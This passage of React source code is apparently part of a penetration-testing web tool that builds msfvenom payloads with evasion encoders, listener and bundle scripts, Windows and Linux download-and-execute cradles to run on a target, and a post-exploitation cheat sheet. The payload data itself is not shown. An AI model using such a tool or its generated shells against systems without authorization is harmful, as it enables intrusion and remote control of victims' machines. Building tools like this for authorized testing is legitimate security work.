                        className={`msf-cat-btn ${msfCategory === cat ? "active" : ""}`}
                        onClick={() => {
                          setMsfCategory(cat);
                          setMsfSearch("");
                          const first = MSF_PAYLOADS.find(
                            (p) => p.category === cat,
                          );
                          if (first) setSelectedMsf(first);
                        }}
                      >
                        <span>{PLATFORM_ICONS[cat] ?? "·"}</span>
                        <span style={{ flex: 1 }}>{cat}</span>
                        <span className="msf-cat-count">
                          {
                            MSF_PAYLOADS.filter((p) => p.category === cat)
                              .length
                          }
                        </span>
                      </button>
                    ))}
                  </div>
                  <div
                    style={{
                      flex: 1,
                      display: "flex",
                      flexDirection: "column",
                      minWidth: 0,
                      overflow: "hidden",
                    }}
                  >
                    <div className="msf-search-bar">
                      <input
                        className="msf-search-input"
                        placeholder={`search in ${msfCategory}...`}
                        value={msfSearch}
                        onChange={(e) => setMsfSearch(e.target.value)}
                        spellCheck={false}
                      />
                    </div>
                    <div className="msf-content">
                      {msfCategoryPayloads.length === 0 && (
                        <div className="empty-state">no payloads match</div>
                      )}
                      {msfCategoryPayloads.map((msf) => {
                        const cmd = buildMsfCmd(msf, ip, port);
                        const listener = buildMsfListener(msf, ip, port);
                        const isSel = selectedMsf.id === msf.id;
                        return (
                          <div
                            key={msf.id}
                            className={`msf-card ${isSel ? "active" : ""}`}
                            onClick={() => setSelectedMsf(msf)}
                          >
                            <div className="msf-card-header">
                              <span className="msf-card-title">
                                {msf.label}
                              </span>
                              <div className="badges">
                                <span className="badge badge-dim">
                                  {msf.platform}
                                </span>
                                <span className="badge badge-dim">
                                  {msf.arch}
                                </span>
                                <span className="badge badge-dim">
                                  .{msf.format}
                                </span>
                                {msf.staged !== undefined && (
                                  <span
                                    className={`badge ${msf.staged ? "badge-staged" : "badge-stageless"}`}
                                  >
                                    {msf.staged ? "STAGED" : "STAGELESS"}
                                  </span>
                                )}
                              </div>
                            </div>
                            {msf.id === "win-x64-encoded" && (
                              <div className="msf-evasion">
                                <span
                                  style={{ fontSize: "10px", color: t.muted }}
                                >
                                  encoder:
                                </span>
                                <select
                                  className="mini-select"
                                  value={msfEncoder}
                                  onChange={(e) =>
                                    setMsfEncoder(e.target.value)
                                  }
                                  onClick={(e) => e.stopPropagation()}
                                >
                                  <option value="x86/shikata_ga_nai">
                                    x86/shikata_ga_nai
                                  </option>
                                  <option value="x64/xor">x64/xor</option>
                                  <option value="x64/xor_dynamic">
                                    x64/xor_dynamic
                                  </option>
                                  <option value="x86/xor_dynamic">
                                    x86/xor_dynamic
                                  </option>
                                  <option value="cmd/powershell_base64">
                                    cmd/powershell_base64
                                  </option>
                                </select>
                                <span
                                  style={{ fontSize: "10px", color: t.muted }}
                                >
                                  iterations:
                                </span>
                                <input
                                  className="mini-input"
                                  type="number"
                                  min="1"
                                  max="20"
                                  value={msfIterations}
                                  onChange={(e) =>
                                    setMsfIterations(e.target.value)
                                  }
                                  onClick={(e) => e.stopPropagation()}
                                />
                              </div>
                            )}
                            <div className="msf-cmd-block">
                              <span style={{ color: t.accent }}>$ </span>
                              <span
                                dangerouslySetInnerHTML={{
                                  __html: highlightPayload(cmd, t.accent),
                                }}
                              />
                              <span className="cursor" />
                            </div>
                            <div className="msf-notes">💡 {msf.notes}</div>
                            <div className="msf-actions">
                              <div
                                style={{
                                  display: "flex",
                                  gap: "5px",
                                  flexWrap: "wrap",
                                }}
                              >
                                {msf.mitre?.map((tag) => (
                                  <a
                                    key={tag}
                                    className="mitre-tag"
                                    href={`https://attack.mitre.org/techniques/${tag.replace(".", "/")}`}
                                    target="_blank"
                                    rel="noopener noreferrer"
                                  >
                                    {tag} ↗
                                  </a>
                                ))}
                              </div>
                              <div
                                style={{
                                  display: "flex",
                                  gap: "5px",
                                  flexWrap: "wrap",
                                }}
                              >
                                <button
                                  className="action-btn"
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    setShowMsfListener((v) => !v);
                                  }}
                                  style={{ fontSize: "9px" }}
                                >
                                  {showMsfListener
                                    ? "hide listener"
                                    : "listener"}
                                </button>
                                <button
                                  className="action-btn"
                                  title="Download msfvenom command as shell script"
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    const hdr = engagement.name
                                      ? `# Engagement: ${engagement.name} | ID: ${engagement.id || "N/A"}\n# Target: ${engagement.target || "N/A"} | Operator: ${engagement.operator || "N/A"}\n`
                                      : "";
                                    downloadText(
                                      `#!/usr/bin/env bash\n# msfvenom: ${msf.label}\n${hdr}# ${new Date().toISOString()}\n# LHOST:${ip} LPORT:${port} | Platform:${msf.platform}/${msf.arch} Format:.${msf.format}\n# MITRE: ${msf.mitre?.join(", ") || "N/A"}\n# Notes: ${msf.notes}\n\n${cmd}\n\necho "[+] Generated: ${msf.output}"\n`,
                                      `gen_${msf.id}.sh`,
                                    );
                                  }}
                                  style={{ fontSize: "9px" }}
                                >
                                  ↓ cmd.sh
                                </button>
                                <button
                                  className="action-btn"
                                  title="Download listener script"
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    downloadListenerScript(msf, listener);
                                  }}
                                  style={{ fontSize: "9px" }}
                                >
                                  ↓ listener.sh
                                </button>
                                <button
                                  className="action-btn warning"
                                  title="Download full bundle: generate + serve + listener"
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    downloadMsfBundle(msf, cmd, listener);
                                  }}
                                  style={{ fontSize: "9px" }}
                                >
                                  ↓ bundle.sh
                                </button>
                                <button
                                  className={`action-btn ${copiedMsf === msf.id ? "success" : "primary"}`}
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    copyText(cmd, setCopiedMsf, msf.id);
                                  }}
                                >
                                  {copiedMsf === msf.id
                                    ? "✓ copied!"
                                    : "copy cmd"}
                                </button>
                              </div>
                            </div>
                            {showMsfListener && (
                              <div className="msf-listener-block">
                                <div
                                  style={{
                                    fontSize: "9px",
                                    color: t.muted,
                                    marginBottom: "5px",
                                    letterSpacing: "1px",
                                  }}
                                >
                                  ── LISTENER ──────────────────
                                </div>
                                {listener.split("\n").map((line, i) => (
                                  <div key={i}>
                                    {line.startsWith("#") ? (
                                      <span style={{ color: t.muted }}>
                                        {line}
                                      </span>
                                    ) : (
                                      <span
                                        dangerouslySetInnerHTML={{
                                          __html: highlightPayload(
                                            line,
                                            t.accent,
                                          ),
                                        }}
                                      />
                                    )}
                                  </div>
                                ))}
                                <div
                                  style={{
                                    display: "flex",
                                    gap: "5px",
                                    marginTop: "8px",
                                  }}
                                >
                                  <button
                                    className={`tty-copy-btn ${copiedMsf === msf.id + "-l" ? "done" : ""}`}
                                    onClick={(e) => {
                                      e.stopPropagation();
                                      copyText(
                                        listener,
                                        setCopiedMsf,
                                        msf.id + "-l",
                                      );
                                    }}
                                  >
                                    {copiedMsf === msf.id + "-l"
                                      ? "✓ copied"
                                      : "copy listener"}
                                  </button>
                                  <button
                                    className="tty-copy-btn"
                                    onClick={(e) => {
                                      e.stopPropagation();
                                      downloadListenerScript(msf, listener);
                                    }}
                                  >
                                    ↓ listener.sh
                                  </button>
                                </div>
                              </div>
                            )}
                          </div>
                        );
                      })}
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* ── WEB DELIVERY TAB ── */}
            {activeTab === "webdelivery" && (
              <div
                className="output-card"
                style={{
                  flex: 1,
                  display: "flex",
                  flexDirection: "column",
                  minHeight: 0,
                }}
              >
                <div className="card-header">
                  <span className="card-title">WEB DELIVERY CRADLES</span>
                  <div className="card-actions">
                    <span style={{ fontSize: "9px", color: t.muted }}>
                      serve port:
                    </span>
                    <input
                      value={webPort}
                      onChange={(e) => setWebPort(e.target.value)}
                      style={{
                        width: "60px",
                        padding: "3px 7px",
                        background: t.bg,
                        border: `1px solid ${t.border}`,
                        color: t.text,
                        fontFamily: "'JetBrains Mono',monospace",
                        fontSize: "11px",
                        outline: "none",
                      }}
                    />
                  </div>
                </div>
                <div style={{ overflow: "auto", flex: 1 }}>
                  <div className="web-section-title">
                    ▶ START HTTP SERVER (run on attack box)
                  </div>
                  {webCradles
                    .filter((c) => c.id.startsWith("server"))
                    .map((c) => (
                      <div key={c.id} className="web-cmd-card">
                        <div className="web-cmd-header">
                          <span className="web-cmd-label">{c.label}</span>
                          <button
                            className={`tty-copy-btn ${copiedWeb === c.id ? "done" : ""}`}
                            onClick={() => copyText(c.cmd, setCopiedWeb, c.id)}
                          >
                            {copiedWeb === c.id ? "✓" : "copy"}
                          </button>
                        </div>
                        <div className="web-cmd-body">
                          <span
                            dangerouslySetInnerHTML={{
                              __html: highlightPayload(c.cmd, t.accent),
                            }}
                          />
                        </div>
                      </div>
                    ))}
                  <div className="web-section-title">
                    🐧 LINUX DOWNLOAD CRADLES (run on target)
                  </div>
                  {webCradles
                    .filter((c) =>
                      [
                        "bash-curl",
                        "bash-wget",
                        "python-urllib",
                        "ruby-open",
                        "php-system",
                      ].includes(c.id),
                    )
                    .map((c) => (
                      <div key={c.id} className="web-cmd-card">
                        <div className="web-cmd-header">
                          <span className="web-cmd-label">{c.label}</span>
                          <button
                            className={`tty-copy-btn ${copiedWeb === c.id ? "done" : ""}`}
                            onClick={() => copyText(c.cmd, setCopiedWeb, c.id)}
                          >
                            {copiedWeb === c.id ? "✓" : "copy"}
                          </button>
                        </div>
                        <div className="web-cmd-body">
                          <span
                            dangerouslySetInnerHTML={{
                              __html: highlightPayload(c.cmd, t.accent),
                            }}
                          />
                        </div>
                      </div>
                    ))}
                  <div className="web-section-title">
                    🪟 WINDOWS DOWNLOAD CRADLES (run on target)
                  </div>
                  {webCradles
                    .filter((c) =>
                      [
                        "ps-iex",
                        "ps-iwr",
                        "ps-b64-cradle",
                        "certutil-dl",
                        "bitsadmin",
                        "regsvr32-scr",
                        "mshta-url",
                      ].includes(c.id),
                    )
                    .map((c) => (
                      <div key={c.id} className="web-cmd-card">
                        <div className="web-cmd-header">
                          <span className="web-cmd-label">{c.label}</span>
                          <button
                            className={`tty-copy-btn ${copiedWeb === c.id ? "done" : ""}`}
                            onClick={() => copyText(c.cmd, setCopiedWeb, c.id)}
                          >
                            {copiedWeb === c.id ? "✓" : "copy"}
                          </button>
                        </div>
                        <div
                          className="web-cmd-body"
                          style={{ wordBreak: "break-all" }}
                        >
                          <span
                            dangerouslySetInnerHTML={{
                              __html: highlightPayload(c.cmd, t.accent),
                            }}
                          />
                        </div>
                      </div>
                    ))}
                </div>
              </div>
            )}

            {/* ── POST-EXPLOIT CHEAT SHEET ── */}
            {activeTab === "postex" && (
              <div
                className="output-card"
                style={{
                  flex: 1,
                  display: "flex",
                  flexDirection: "column",
                  minHeight: 0,
                }}
              >
                <div className="card-header">
                  <span className="card-title">
                    POST-EXPLOITATION CHEAT SHEET
                  </span>
                  <span className="length-badge">
                    {POSTEX_SECTIONS.reduce((a, s) => a + s.commands.length, 0)}{" "}
                    commands
                  </span>
                </div>
                <div className="postex-layout">
                  <div className="postex-sidebar">
                    {POSTEX_SECTIONS.map((s) => (
                      <button
                        key={s.id}
                        className={`postex-sec-btn ${postexSection === s.id ? "active" : ""}`}
                        onClick={() => {
                          setPostexSection(s.id);
                          setPostexFilter("");
                        }}
                      >
                        <span>{s.icon}</span>
                        <span style={{ flex: 1 }}>{s.label}</span>
                        <span className="msf-cat-count">
                          {s.commands.length}
                        </span>
                      </button>
                    ))}
                  </div>
                  <div
                    style={{
                      flex: 1,
                      display: "flex",
                      flexDirection: "column",
                      minWidth: 0,
                      overflow: "hidden",
                    }}
                  >
                    <div className="postex-filter">
                      <input
                        className="postex-filter-input"
                        placeholder="filter commands..."
                        value={postexFilter}
                        onChange={(e) => setPostexFilter(e.target.value)}
                        spellCheck={false}
                      />
                    </div>
                    <div className="postex-content">
                      {filteredPostexCmds.length === 0 && (
                        <div className="empty-state">no commands match</div>
                      )}
                      {filteredPostexCmds.map((cmd, i) => (
                        <div key={i} className="postex-cmd-card">
                          <div className="postex-cmd-header">
                            <span className="postex-cmd-label">
                              {cmd.label}
                            </span>
                            <button
                              className={`tty-copy-btn ${copiedPostex === `${postexSection}-${i}` ? "done" : ""}`}
                              onClick={() =>
                                copyText(
                                  cmd.cmd,
                                  setCopiedPostex,
                                  `${postexSection}-${i}`,
                                )
                              }
                            >
                              {copiedPostex === `${postexSection}-${i}`
                                ? "✓ copied"
                                : "copy"}
                            </button>
                          </div>
                          <div className="postex-cmd-body">{cmd.cmd}</div>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* ── ENGAGEMENT / NOTES TAB ── */}
            {activeTab === "notes" && (
              <div
                className="output-card"
                style={{
                  flex: 1,
                  display: "flex",
                  flexDirection: "column",
                  minHeight: 0,
                }}
              >
                <div className="card-header">
                  <span className="card-title">
                    ENGAGEMENT METADATA + HISTORY
                  </span>
                  <div className="card-actions">
                    <button
                      className="action-btn warning"
                      onClick={downloadEngagementReport}
                      title="Download full engagement report"
                    >
                      ↓ report.txt
                    </button>
                    <button
                      className="action-btn"
                      onClick={() => setHistory([])}
                    >
                      clear history
                    </button>
                  </div>
                </div>
                <div className="eng-layout">
                  <div className="eng-form">
                    <div
                      style={{
                        fontSize: "11px",
                        color: t.muted,
                        lineHeight: "1.6",
                        borderBottom: `1px solid ${t.border}`,
                        paddingBottom: "10px",
                        marginBottom: "4px",
                      }}
                    >
                      Fill in engagement details — stamped into all downloaded
                      scripts and reports.
                    </div>
                    {(
                      [
                        ["name", "Engagement Name"],
                        ["id", "Engagement ID"],
                        ["target", "Target / Scope"],
                        ["operator", "Operator Name"],
                      ] as [keyof Engagement, string][]
                    ).map(([field, label]) => (
                      <div key={field}>
                        <div className="eng-label">{label}</div>
                        <input
                          className="eng-input"
                          value={engagement[field]}
                          onChange={(e) =>
                            setEngagement((p) => ({
                              ...p,
                              [field]: e.target.value,
                            }))
                          }
                          placeholder={
                            field === "name"
                              ? "Internal Web App Pentest"
                              : field === "id"
                                ? "ENG-2024-001"
                                : field === "target"
                                  ? "192.168.1.0/24"
                                  : field === "operator"
                                    ? "operator1"
                                    : ""
                          }
                          spellCheck={false}
                        />
                      </div>
                    ))}
                    <div>
                      <div className="eng-label">Scope Notes</div>
                      <input
                        className="eng-input"
                        value={engagement.scope}
                        onChange={(e) =>
                          setEngagement((p) => ({
                            ...p,
                            scope: e.target.value,
                          }))
                        }
                        placeholder="172.16.0.0/16 + domain.internal"
                        spellCheck={false}
                      />
                    </div>
                    <div>
                      <div className="eng-label">Notes / Findings</div>
                      <textarea
                        ref={notesRef}
                        className="eng-textarea"
                        value={engagement.notes}
                        onChange={(e) =>
                          setEngagement((p) => ({
                            ...p,
                            notes: e.target.value,
                          }))
                        }
                        placeholder="— RCE via CVE-XXXX on target&#10;— Creds found: admin:password123&#10;— Lateral to DC via PTH..."
                      />
                    </div>
                    <button
                      className="action-btn warning"
                      style={{ width: "100%", padding: "7px" }}
                      onClick={downloadEngagementReport}
                    >
                      ↓ Download Full Report
                    </button>
                  </div>
                  <div className="hist-panel">
                    <div
                      style={{
                        fontSize: "9px",
                        color: t.muted,
                        letterSpacing: "2px",
                        marginBottom: "6px",
                      }}
                    >
                      PAYLOAD HISTORY — {history.length} entries (click to copy)
                    </div>
                    {history.length === 0 && (
                      <div className="empty-state">
                        no history yet — generate payloads to populate
                      </div>
                    )}
                    {history.map((h, i) => (
                      <div
                        key={i}
                        className="hist-item"
                        onClick={() => navigator.clipboard.writeText(h.payload)}
                      >
                        <div className="hist-payload">{h.payload}</div>
                        <div className="hist-meta">
                          <span style={{ color: t.accent }}>{h.shell}</span>
                          <span>
                            {h.ip}:{h.port}
                          </span>
                          <span>{new Date(h.ts).toLocaleTimeString()}</span>
                          <span>{h.payload.length} chars</span>
                          <span style={{ color: t.dim }}>click to copy</span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>

      <footer className="footer">
        <div className="footer-text">
          <span className="status-dot" />
          {SHELLS.length} shells · {MSF_PAYLOADS.length} msf payloads ·{" "}
          {POSTEX_SECTIONS.reduce((a, s) => a + s.commands.length, 0)} post-ex
          cmds · {MSF_CATEGORIES.length} categories
          {engagement.name && (
            <span style={{ color: t.accent }}> · 📋 {engagement.name}</span>
          )}
        </div>
        <div className="footer-text">
          DREW&apos;S REVSHELL v3.0 · authorized engagements only
        </div>
      </footer>
    </div>
  );
}
